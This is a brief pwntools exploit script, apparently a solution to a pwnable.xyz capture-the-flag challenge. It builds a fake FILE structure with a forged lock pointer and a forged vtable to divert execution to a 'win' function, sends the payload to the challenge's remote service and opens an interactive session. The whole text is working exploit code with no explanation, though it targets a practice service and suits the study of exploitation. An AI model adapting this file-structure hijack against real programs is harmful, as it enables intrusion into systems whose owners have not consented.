from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30018)

fp = 0x601260
win = 0x4007ec

payload = b''
payload = payload.ljust(0x88, b'\x00')
payload += p64(fp + 0x120) # _lock
payload = payload.ljust(0xd8, b'\x00')
payload += p64(fp + 0x100) # vtable
payload = payload.ljust(0x110, b'\x00')
payload += p64(win)

r.sendafter('> ', payload)

r.interactive()